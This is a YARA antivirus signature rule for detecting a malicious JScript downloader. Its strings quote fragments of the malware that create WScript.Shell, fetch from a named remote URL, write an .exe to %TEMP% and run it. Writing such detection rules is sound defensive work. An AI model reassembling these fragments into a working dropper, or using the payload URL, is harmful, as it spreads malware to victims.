rule sig_20160328_0b4f266cc13aa8d4e3e8bee24c255ab3 {
  meta:
    description = "datamaliciousorder - file 20160328_0b4f266cc13aa8d4e3e8bee24c255ab3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d1f08b5da086b4ebee2ce960c09be891f5655e72e24c8bae86de7d1594d9218"

  strings:
    $s1  = "function Lxsgyl() {return Rbronxh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"i1zUDzQelNEDOIYZ.exe\";};" fullword ascii
    $s2  = "Opieyssgp[Otmzlr](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Wvekpjdair](Mtwfchopj() * 11)} while (Opieyssgp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Rbronxh = function Jqpfc() {return WScript[Vehbrewv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Crybpuu(Eycveeuiy, Kccecr){return Eycveeuiy - Kccecr;};" fullword ascii
    $s6  = "function Ruamqbrnq(Fmbzi){Rbronxh[\"Run\"](Fmbzi, Otxwdha, Otxwdha);};" fullword ascii
    $s7  = "function Kygmnyfx() {return ((Dotfxtbvc == true) && (Dotfxtbvc == Yaquu)) ? 1 : Otxwdha;};" fullword ascii
    $s8  = " while (Vvawqwpkue){" fullword ascii
    $s9  = "Yaquu = true; " fullword ascii
    $s10 = "var Dotfxtbvc = false;" fullword ascii
    $s11 = "Dotfxtbvc = true; " fullword ascii
    $s12 = "function Khqsnqqbco(Lobeli) {var Szuemtgkpt = (1, 2, 3, 4, 5, Lobeli); return Szuemtgkpt;};" fullword ascii
    $s13 = "function Xwoaq(){return Vehbrewv;};" fullword ascii
    $s14 = "function Iuvcqa(){return Flzpy;};" fullword ascii
    $s15 = "var Ilbzsq = false;" fullword ascii
    $s16 = "var Yaquu = false;" fullword ascii
    $s17 = "return Crybpuu(Dkaxdefzjd, Melxeekomv);" fullword ascii
    $s18 = "function Mtwfchopj(){return 22;};" fullword ascii
    $s19 = "function Eibwtp()" fullword ascii
    $s20 = "var Sejdrw = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}